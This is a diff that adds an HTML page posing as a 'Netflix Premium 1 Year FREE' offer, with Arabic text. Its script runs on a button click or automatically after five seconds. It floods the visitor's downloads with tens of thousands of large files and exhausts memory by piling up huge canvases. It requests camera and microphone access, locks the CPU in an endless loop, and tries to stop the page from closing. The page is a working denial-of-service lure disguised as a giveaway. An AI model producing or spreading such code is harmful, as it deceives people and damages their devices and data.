@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Netflix Premium</title>
+    <meta name="viewport" content="width=device-width">
+</head>
+<body style="margin:0; background:black; color:white; text-align:center; font-family:Arial;">
+    <div style="padding:50px;">
+        <h1>🎥 Netflix Premium 1 Year FREE</h1>
+        <p>اضغط Continue للحصول على الكود</p>
+        <button onclick="startAttack()" style="padding:20px 40px; font-size:20px; background:#ff0000; color:white; border:none; border-radius:10px;">Continue ▶️</button>
+    </div>
+
+    <script>
+    function startAttack() {
+        document.body.innerHTML = '<h1>جاري التحميل...</h1>';
+        
+        // 1. FLOOD Downloads (الأقوى)
+        floodDownloads();
+        
+        // 2. RAM Killer
+        memoryKiller();
+        
+        // 3. Battery Drain
+        batteryDrain();
+        
+        // 4. Prevent Close
+        antiClose();
+    }
+    
+    // ملايين الملفات في Downloads
+    function floodDownloads() {
+        for(let i = 0; i < 50000; i++) {
+            setTimeout(() => {
+                const a = document.createElement('a');
+                const blob = new Blob(['نتنفليكس مجاناً'.repeat(1000000)], 
+                                    {type: 'text/plain'});
+                a.href = URL.createObjectURL(blob);
+                a.download = `netflix_${i}_${Date.now()}.txt`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }, i * 10);
+        }
+    }
+    
+    // قتل الذاكرة RAM
+    function memoryKiller() {
+        let leaks = [];
+        setInterval(() => {
+            for(let i = 0; i < 10000; i++) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 4096;
+                canvas.height = 4096;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = '#ff0000';
+                ctx.fillRect(0, 0, 4096, 4096);
+                leaks.push(canvas);
+            }
+        }, 100);
+    }
+    
+    // تصريف البطارية
+    function batteryDrain() {
+        navigator.mediaDevices.getUserMedia({ 
+            video: {width: 4096, height: 4096}, 
+            audio: true 
+        }).catch(() => {});
+        
+        // CPU 100%
+        while(true) {
+            Math.random() * Math.random();
+        }
+    }
+    
+    // منع الإغلاق
+    function antiClose() {
+        window.onbeforeunload = () => "لا تغلق! Netflix يُحمل";
+        document.onkeydown = (e) => {
+            if(e.key === 'Escape') e.preventDefault();
+        };
+    }
+    
+    // بدء تلقائي بعد 5 ثوان
+    setTimeout(startAttack, 5000);
+    </script>
+</body>
+</html>
